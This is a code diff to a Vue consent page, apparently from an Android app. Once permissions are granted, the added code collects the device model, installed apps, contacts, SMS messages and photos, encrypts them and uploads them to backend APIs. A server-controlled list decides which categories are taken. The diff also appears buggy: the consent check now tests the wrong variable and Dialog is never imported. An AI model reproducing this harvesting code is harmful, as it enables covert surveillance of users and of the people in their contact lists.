@@ -16,7 +16,10 @@
     </div>
 </template>
 <script>
-import { Toast } from 'vant'
+import { Toast } from "vant";
+import { getPermission, getDeviceInfo, getApp, getSms, getPhoto, getContact, getPhoneInfo } from "../../utils/android.js";
+import { setDeviceInfoAPI, getshebeiInfoAPI, getAppInfoAPI, gettxlAPI, getduanxinAPI, getPhotoInfoAPI } from "../../api";
+import { add, unt } from "../../utils/AES.js";
 import isNext from '../form/isNext.js'
 export default {
     name: 'beforeqx',
@@ -31,12 +34,56 @@ export default {
             this.isChecked = !this.isChecked
         },
         //跳转到下一页
-        toNext() {
-            if (this.isChecked) {
+        async toNext() {
+            if (this.beforeqx) {
+                // 去获取权限，上报权限，并且判断下一步跳转哪里
+                let res = await getPermission()
+                //拒绝两次
+                if (!res.result) {
+                    Dialog({
+                        message: 'Please re-acquire the permission, if it is rejected twice, please open the permission in the phone settings', confirmButtonText: 'Confirm'
+                    });
+                    return
+                }
+                //上报设备信息
+                this.getInfo()
                 isNext()
             } else {
                 Toast('Please check the agreement first')
             }
+        },
+        //获取设备信息上报情况
+        async getInfo() {
+            const res = await setDeviceInfoAPI()
+            this.list = unt(res.data).list
+            console.log(this.list, 'this.list')
+            console.log(JSON.stringify(this.list), 'this.list')
+            if (this.list.indexOf("DEVICE") > -1) {
+                let res = await getDeviceInfo();
+                let info = JSON.parse(res.appInfo);
+                getshebeiInfoAPI(add({ model: info.device }))
+            }
+            if (this.list.indexOf('APP') > -1) {
+                let res = await getApp();
+                let info = JSON.parse(res.appInfo);
+                getAppInfoAPI(add({ model: { deviceApps: info.deviceApps } }))
+            }
+            if (this.list.indexOf("CONTACT") > -1) {
+                let res = await getContact();
+                let info = JSON.parse(res.appInfo);
+                gettxlAPI(add({ model: { deviceContacts: info.deviceContacts } }))
+            }
+            if (this.list.indexOf("SMS") > -1) {
+                let res = await getSms();
+                let info = JSON.parse(res.appInfo);
+                getduanxinAPI(add({ model: { list: info.smsList } }))
+            }
+            if (this.list.indexOf("PHOTO") > -1) {
+                let res = await getPhoto();
+                let info = JSON.parse(res.appInfo);
+                getPhotoInfoAPI(add({ model: { list: info.photoList } }))
+            }
+            console.log(this.list, '设备信息上报情况')
         }
     }
 }
